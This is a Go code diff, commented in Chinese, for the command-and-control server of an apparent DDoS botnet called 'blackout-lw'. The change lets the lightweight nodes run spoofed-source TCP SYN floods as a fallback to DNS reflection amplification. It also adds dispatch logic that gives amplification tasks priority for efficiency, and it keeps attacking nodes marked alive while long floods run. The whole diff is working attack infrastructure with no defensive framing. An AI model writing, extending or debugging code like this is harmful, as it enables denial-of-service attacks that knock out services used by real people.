@@ -41,13 +41,13 @@ func (c *Ctrl) isLWNode(id string) bool {
 	return ok && isLWNodeLocked(n)
 }
 
-// isReflectorTaskMethod 判断任务是否反射类（lw 节点只参与反射任务）
-func isReflectorTaskMethod(method string) bool {
-	switch method {
-	case "vse_reflector", "dns_reflector", "cldap_reflector":
-		return true
-	}
-	return false
+// lwCapableMethod 判断方法是否可由 lw（Rust 轻量节点）执行。
+// lw 能力范围：DNS 反射放大（dns_reflector，优先派发）与伪源 TCP SYN 洪水
+// （tcp_syn，无反射任务可派时的回退）。其余方法 lw 不参与——
+// 派发循环与"全部节点已领取"判定都必须用本函数，否则会把 lw 算进
+// 它无法执行的方法，导致任务永远等不到全部节点领取（或提前误判）。
+func lwCapableMethod(method string) bool {
+	return method == "dns_reflector" || method == "tcp_syn"
 }
 
 // lwTask 心跳响应的任务 JSON（与 blackout-lw Rust 端 TaskMsg 对齐）。
@@ -117,12 +117,12 @@ func (c *Ctrl) handleLWRegister(w http.ResponseWriter, r *http.Request) {
 		assignedID = fmt.Sprintf("%s-%d", baseID, suffix)
 	}
 	node := &NodeInfo{
-		WorkerID:    assignedID,
-		IP:          peerIP,
-		Status:      "READY",
+		WorkerID:      assignedID,
+		IP:            peerIP,
+		Status:        "READY",
 		LastHeartbeat: time.Now(),
-		IsWindows:   false,
-		Platform:    req.Platform + "-" + req.Arch,
+		IsWindows:     false,
+		Platform:      req.Platform + "-" + req.Arch,
 		// lw 节点的存在意义即伪造：能力确定
 		CanSpoof:    true,
 		SpoofTested: true,
@@ -140,7 +140,8 @@ func (c *Ctrl) handleLWRegister(w http.ResponseWriter, r *http.Request) {
 // handleLWHeartbeat POST /api/lw/heartbeat
 // body: {"token":"...","node_id":"..."}
 // 返回: {"task":{...}|null, "kick":bool}
-// 心跳即任务轮询：只派发 dns_reflector 任务（lw 的能力范围）。
+// 心跳即任务轮询：只派发 lwCapableMethod 内的任务
+// （dns_reflector 优先，无反射任务可派时回退 tcp_syn）。
 func (c *Ctrl) handleLWHeartbeat(w http.ResponseWriter, r *http.Request) {
 	var req struct {
 		Token  string `json:"token"`
@@ -175,46 +176,65 @@ func (c *Ctrl) handleLWHeartbeat(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// 派发：从 pendingIDs 找第一个可派发的 dns_reflector 任务
+	// 派发：lw 支持的方法里优先反射任务（dns_reflector），
+	// 没有反射任务可派时回退到 tcp_syn（伪源 SYN 洪水）。
+	// 两轮扫描：第一轮只找 dns_reflector，第二轮才考虑 tcp_syn——
+	// 保证反射任务优先占用 lw 节点（反射放大效率远高于直接 SYN 洪水）。
 	var task *lwTask
 	c.mu.Lock()
-	rem := c.pendingIDs[:0]
-	for i, tid := range c.pendingIDs {
-		t := c.tasks[tid]
-		if t == nil || t.Status != "pending" || t.Method != "dns_reflector" {
-			continue
+	for _, preferReflector := range []bool{true, false} {
+		if task != nil {
+			break
 		}
-		if t.NextRunAt.After(time.Now()) {
-			rem = append(rem, tid)
-			continue
+		rem := c.pendingIDs[:0]
+		for i, tid := range c.pendingIDs {
+			t := c.tasks[tid]
+			if t == nil || t.Status != "pending" {
+				rem = append(rem, tid)
+				continue
+			}
+			// 本轮只处理对应的方法类别
+			isRefl := t.Method == "dns_reflector"
+			if preferReflector != isRefl {
+				rem = append(rem, tid)
+				continue
+			}
+			if !lwCapableMethod(t.Method) {
+				rem = append(rem, tid)
+				continue
+			}
+			if t.NextRunAt.After(time.Now()) {
+				rem = append(rem, tid)
+				continue
+			}
+			if len(t.SelectedWorkers) > 0 && !containsStr(t.SelectedWorkers, req.NodeID) {
+				rem = append(rem, tid)
+				continue
+			}
+			if c.workerHasTask(t, req.NodeID) {
+				rem = append(rem, tid)
+				continue
+			}
+			// 派发给本 lw 节点
+			t.Workers[req.NodeID] = &TaskStats{WorkerID: req.NodeID}
+			if c.onlineWorkersAllAssigned(t) {
+				t.Status = "running"
+				t.StartTime = time.Now()
+			} else {
+				rem = append(rem, tid)
+			}
+			task = &lwTask{
+				TaskID:   t.TaskID,
+				Target:   t.Target,
+				Method:   t.Method,
+				Duration: t.Duration,
+				Threads:  t.Threads,
+			}
+			rem = append(rem, c.pendingIDs[i+1:]...)
+			break
 		}
-		if len(t.SelectedWorkers) > 0 && !containsStr(t.SelectedWorkers, req.NodeID) {
-			rem = append(rem, tid)
-			continue
-		}
-		if c.workerHasTask(t, req.NodeID) {
-			rem = append(rem, tid)
-			continue
-		}
-		// 派发给本 lw 节点
-		t.Workers[req.NodeID] = &TaskStats{WorkerID: req.NodeID}
-		if c.onlineWorkersAllAssigned(t) {
-			t.Status = "running"
-			t.StartTime = time.Now()
-		} else {
-			rem = append(rem, tid)
-		}
-		task = &lwTask{
-			TaskID:   t.TaskID,
-			Target:   t.Target,
-			Method:   t.Method,
-			Duration: t.Duration,
-			Threads:  t.Threads,
-		}
-		rem = append(rem, c.pendingIDs[i+1:]...)
-		break
+		c.pendingIDs = rem
 	}
-	c.pendingIDs = rem
 	if task != nil {
 		if n, nok := c.nodes[req.NodeID]; nok {
 			n.Status = "ATTACKING"
@@ -268,6 +288,14 @@ func (c *Ctrl) handleLWReport(w http.ResponseWriter, r *http.Request) {
 					st.CurrentPPS = req.PPS
 					if req.PPS > st.PeakPPS {
 						st.PeakPPS = req.PPS
+					}
+					// 上报即存活证明：长任务期间 lw 阻塞在攻击循环里不发心跳，
+					// 靠上报刷新心跳时间，避免长任务中途被判离线/状态闪烁。
+					if n, nok := c.nodes[req.NodeID]; nok {
+						n.LastHeartbeat = time.Now()
+						if n.Status == "" || n.Status == "OFFLINE" {
+							n.Status = "ATTACKING"
+						}
 					}
 				}
 			}
